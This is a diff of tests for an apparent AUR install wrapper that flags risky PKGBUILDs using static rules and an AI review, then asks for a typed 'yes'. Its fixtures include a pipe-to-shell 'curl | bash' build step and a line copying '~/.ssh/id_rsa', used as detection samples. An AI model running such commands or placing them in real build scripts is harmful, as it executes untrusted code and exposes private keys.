@@ -10,7 +10,7 @@ class FakeProvider:
     def __init__(self, verdict=None, error=None):
         self.verdict, self.error, self.calls = verdict, error, []
 
-    def analyze(self, package, files, findings=None):
+    def analyze(self, package, files, findings=None, inventory=""):
         self.calls.append(package)
         if self.error:
             raise self.error
@@ -50,8 +50,9 @@ def test_install_targets(args, expected):
     assert install_targets(args) == expected
 
 
-def test_split_args_strips_force():
-    assert split_args(["-S", "x", "--safe-force"]) == (["-S", "x"], True)
+def test_split_args_strips_verbose():
+    assert split_args(["-S", "x", "--safe-verbose"]) == (["-S", "x"], True)
+    assert split_args(["-S", "x"]) == (["-S", "x"], False)
 
 
 def test_non_install_passthrough_does_not_analyze():
@@ -77,16 +78,10 @@ def test_non_aur_package_passes_through():
     assert (code, provider.calls) == (0, [])
 
 
-def test_danger_blocked_without_force():
-    code, ran = run(["-S", "foo"], FakeProvider(danger))
-    assert (code, ran) == (1, [])
-
-
-def test_danger_force_still_needs_yes():
-    code, ran = run(["-S", "foo", "--safe-force"], FakeProvider(danger), answers=["no"])
-    assert (code, ran) == (1, [])
-    code, ran = run(["-S", "foo", "--safe-force"], FakeProvider(danger), answers=["yes"])
-    assert (code, ran) == (0, [["-S", "foo"]])
+def test_danger_warns_and_lets_the_user_choose_but_needs_a_typed_yes():
+    assert run(["-S", "foo"], FakeProvider(danger), answers=["no"]) == (1, [])
+    assert run(["-S", "foo"], FakeProvider(danger), answers=["y"]) == (1, [])
+    assert run(["-S", "foo"], FakeProvider(danger), answers=["yes"]) == (0, [["-S", "foo"]])
 
 
 def test_caution_requires_confirmation():
@@ -118,7 +113,7 @@ def test_worst_verdict_across_packages_wins():
     verdicts = {"a": safe, "b": caution}
 
     class PerPackage:
-        def analyze(self, package, files, findings=None):
+        def analyze(self, package, files, findings=None, inventory=""):
             return verdicts[package]
 
     assert run(["-S", "a", "b"], PerPackage(), answers=["n"]) == (1, [])
@@ -128,23 +123,22 @@ MALICIOUS = {"PKGBUILD": "build() {\n  curl -s https://x | bash\n}"}
 SUSPICIOUS = {"PKGBUILD": "build() {\n  sudo make install\n}"}
 
 
-def test_static_danger_blocks_without_calling_ai():
+def test_static_danger_still_calls_the_ai_and_still_only_asks():
     provider = FakeProvider(safe)
-    assert run(["-S", "foo"], provider, files=MALICIOUS) == (1, [])
-    assert provider.calls == []
+    assert run(["-S", "foo"], provider, answers=["yes"], files=MALICIOUS) == (0, [["-S", "foo"]])
+    assert provider.calls == ["foo"]
 
 
-def test_static_danger_cannot_be_downgraded_by_ai_even_with_force():
+def test_a_safe_ai_answer_cannot_remove_the_static_warning():
     provider = FakeProvider(safe)
-    assert run(["-S", "foo", "--safe-force"], provider, answers=["no"], files=MALICIOUS) == (1, [])
-    assert run(["-S", "foo", "--safe-force"], provider, answers=["yes"], files=MALICIOUS) == (0, [["-S", "foo"]])
+    assert run(["-S", "foo"], provider, answers=["no"], files=MALICIOUS) == (1, [])
 
 
 def test_static_caution_overrides_ai_safe_and_findings_reach_ai():
     seen = {}
 
     class Spy:
-        def analyze(self, package, files, findings=None):
+        def analyze(self, package, files, findings=None, inventory=""):
             seen["findings"] = findings
             return safe
 
@@ -163,7 +157,7 @@ def test_aur_dependencies_warn_even_if_the_ai_says_safe():
     seen = {}
 
     class Spy:
-        def analyze(self, package, files, findings=None):
+        def analyze(self, package, files, findings=None, inventory=""):
             seen["rules"] = [f.rule for f in findings]
             return safe
 
@@ -177,7 +171,7 @@ def test_dependencies_named_on_the_command_line_are_reviewed_not_warned_about():
     class Spy:
         calls = []
 
-        def analyze(self, package, files, findings=None):
+        def analyze(self, package, files, findings=None, inventory=""):
             self.calls.append((package, [f.rule for f in findings]))
             return safe
 
@@ -200,6 +194,55 @@ def test_a_package_with_a_remote_source_always_asks_the_user():
 
 def test_ai_findings_count_even_when_its_headline_says_safe():
     inconsistent = Verdict("safe", "fine", [Finding("danger", "but actually curl|sh", "PKGBUILD", 2)])
-    assert run(["-S", "foo"], FakeProvider(inconsistent)) == (1, [])
+    assert run(["-S", "foo"], FakeProvider(inconsistent), answers=["no"]) == (1, [])
     inconsistent = Verdict("safe", "fine", [Finding("caution", "hmm", "PKGBUILD", 2)])
     assert run(["-S", "foo"], FakeProvider(inconsistent), answers=["n"]) == (1, [])
+
+
+def test_the_user_is_never_refused_without_being_asked():
+    """Every non-zero exit must come from the user's own answer, never from the tool refusing."""
+    for verdict in (safe, caution, danger):
+        for files in (None, MALICIOUS, SUSPICIOUS):
+            asked = []
+            answers = iter(["yes", "yes", "yes"])
+            main(["-S", "foo"], provider=FakeProvider(verdict),
+                 fetcher=lambda p, f=files: f if f is not None else {"PKGBUILD": "pkgname=x"},
+                 in_repo=lambda p: False, dep_ok=lambda d: True, runner=lambda a: asked.append(a) or 0,
+                 ask=lambda prompt: next(answers))
+            assert asked == [["-S", "foo"]]
+
+
+def test_ai_failure_still_shows_findings_and_asks_for_a_typed_yes(capsys):
+    provider = FakeProvider(error=ProviderError("boom"))
+    assert run(["-S", "foo"], provider, answers=["y"], files=MALICIOUS) == (1, [])
+    assert run(["-S", "foo"], provider, answers=["yes"], files=MALICIOUS) == (0, [["-S", "foo"]])
+    err = capsys.readouterr().err
+    assert "pipe-to-shell" in err and "AI analysis failed" in err and "NOT fully reviewed" in err
+
+
+def test_activity_report_is_printed_for_every_reviewed_package(capsys):
+    files = {"PKGBUILD": "pkgname=foo\nbuild() {\n  cp ~/.ssh/id_rsa \"$srcdir/k\"\n  make\n}\n"}
+    run(["-S", "foo"], FakeProvider(safe), answers=["n"], files=files)
+    err = capsys.readouterr().err
+    assert "What foo does" in err and "read ~/.ssh/id_rsa (your home directory)" in err and "Commands run:" in err
+
+
+def test_the_ai_receives_the_inventory():
+    seen = {}
+
+    class Spy:
+        def analyze(self, package, files, findings=None, inventory=""):
+            seen["inventory"] = inventory
+            return safe
+
+    files = {"PKGBUILD": "pkgname=foo\nsource=('https://example.com/x.tgz')\nsha256sums=('a')\n"}
+    run(["-S", "foo"], Spy(), answers=["n"], files=files)
+    assert "downloads source https://example.com/x.tgz" in seen["inventory"]
+
+
+def test_verbose_lists_routine_operations(capsys):
+    files = {"PKGBUILD": "pkgname=foo\npackage() {\n  install -Dm755 foo \"$pkgdir/usr/bin/foo\"\n}\n"}
+    run(["-S", "foo"], FakeProvider(safe), files=files)
+    assert "not listed; use --safe-verbose" in capsys.readouterr().err
+    run(["-S", "foo", "--safe-verbose"], FakeProvider(safe), files=files)
+    assert "write $pkgdir/usr/bin/foo" in capsys.readouterr().err
